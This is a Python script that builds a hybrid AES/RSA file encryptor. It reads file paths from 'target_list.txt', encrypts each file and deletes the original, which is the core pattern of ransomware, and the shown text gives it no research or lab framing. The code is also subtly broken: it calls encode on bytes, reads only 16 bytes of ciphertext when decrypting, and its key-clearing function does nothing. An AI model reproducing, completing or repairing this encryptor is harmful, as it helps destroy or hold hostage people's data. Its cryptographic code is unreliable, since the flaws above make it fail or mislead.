import os
import random
import string
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
import pickle

# Generate a random symmetric key
def generate_key():
    return get_random_bytes(16)

# Encrypt data using AES
def encrypt_data(key, data):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return ciphertext, cipher.nonce, tag

# Decrypt data using AES
def decrypt_data(key, ciphertext, nonce, tag):
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)
    return data.decode()

# Encrypt a file
def encrypt_file(key, in_filename, out_filename=None):
    if not out_filename:
        out_filename = in_filename + '.enc'
    
    with open(in_filename, 'rb') as infile:
        data = infile.read()
    
    ciphertext, nonce, tag = encrypt_data(key, data)
    
    with open(out_filename, 'wb') as outfile:
        outfile.write(ciphertext)
        outfile.write(nonce)
        outfile.write(tag)

# Decrypt a file
def decrypt_file(key, in_filename, out_filename=None):
    if not out_filename:
        out_filename = in_filename[:-4]  # Remove '.enc' from filename
    
    with open(in_filename, 'rb') as infile:
        ciphertext = infile.read(16)  # Read ciphertext
        nonce = infile.read(16)  # Read nonce
        tag = infile.read(16)  # Read tag
    
    data = decrypt_data(key, ciphertext, nonce, tag)
    
    with open(out_filename, 'wb') as outfile:
        outfile.write(data.encode())

# Clear key from memory
def clear_key(key):
    key = b'0' * len(key)

# Generate RSA key pair
def generate_rsa_key_pair():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return private_key, public_key

# Encrypt symmetric key using RSA public key
def encrypt_symmetric_key(symmetric_key, public_key):
    recipient_key = RSA.import_key(public_key)
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    encrypted_key = cipher_rsa.encrypt(symmetric_key)
    return encrypted_key

# Decrypt symmetric key using RSA private key
def decrypt_symmetric_key(encrypted_key, private_key):
    private_key = RSA.import_key(private_key)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    symmetric_key = cipher_rsa.decrypt(encrypted_key)
    return symmetric_key

# Generate a random symmetric key
smem = generate_key()

# Generate RSA key pair
private_key, public_key = generate_rsa_key_pair()

# Encrypt smem with public key and save to disk
encrypted_smem = encrypt_symmetric_key(smem, public_key)
with open('smem.enc', 'wb') as f:
    f.write(encrypted_smem)

# Save private key to disk
with open('private_key.pem', 'wb') as f:
    f.write(private_key)

# Read target list from a file
with open('target_list.txt', 'r') as f:
    target_list = f.readlines()

# Encrypt files in target list
for target_file in target_list:
    target_file = target_file.strip()  # Remove newline character
    if os.path.isfile(target_file):
        encrypt_file(smem, target_file)
        os.remove(target_file)

# Clear smem from memory
clear_key(smem)

print('Encryption completed.')

